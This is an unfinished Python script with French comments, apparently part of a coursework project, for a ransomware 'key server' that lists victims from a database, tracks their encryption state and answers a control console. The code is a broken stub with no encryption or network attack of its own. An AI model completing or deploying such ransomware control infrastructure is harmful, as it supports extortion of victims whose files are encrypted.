import utile.network as net
import utile.message as message
import utile.data as data
"""


WIP 
A CONTINUER


"""
#socket = net.start_net_serv_client()

while True:
    #recv_data = net.receive_message(socket)
    recv_data = {'LIST_REQ': None}
    message_type = message.get_message_type(recv_data)
    print(message_type)

    if message_type == 'LIST_VICTIM_REQ':
        """
        Le message list_victim_req est envoyé par la console de contrôleau serveur de clés pour lui demander de 
        lister les victimes du ransomware en base de données. 
        
        Les réponses list_victim_resp sont  les réponses envoyées du serveur  de  clés pour  chaque  victime enregistrée
        L'identifiant d'une victimeest son id en  base de données(pour rappel, lors de la phase d'initialisation 
        un hash SHA256 est envoyé), state est le dernier état enregistré pour la victime, nb_files est le nombre 
        de fichiers chiffrés ou déchiffrés selon le dernier état enregistré.
        
        La réponse list_victim_end est la réponse envoyée pour clôturer l'envoi du listagedes victimes. 
        """
        conn, cursor = data.connect_to_DB()
        query = data.select("*", "victims")
        result = data.execute_query(conn, cursor, query)
        data.disconnect_from_DB(conn)
        for victim in result:
            print(victim)
            list_victim_resp = message.set_message("LIST_VICTIM_RESP", victim)
            net.send_message(socket, list_victim_resp)

        net.send_message(message.set_message("LIST_VICTIM_END"))



    elif message_type == 'HIST_REQ':
        """
        Le  message history_req est  envoyé  par  la console de  contrôle au serveur  de clés pour  lui  demander 
        l'historique des changements d'état d'une victime du ransomware. 
        
        Les  réponses history_resp sont  les  réponses  envoyées  pour  chaque  changement  d'état  enregistré pour cet 
        identifiant de victime.
        
        La  réponse history_end est  la  réponse  envoyée  pour  clôturer  l'envoi  de  l'historique  pour  la  victime 
        demandée.
        """
        conn, cursor = data.connect_to_DB()

    elif message_type == 'CHGSTATE':
        """
        Le message change_stateest envoyé de la console de contrôlevers leserveur de clés.
        """
        pass
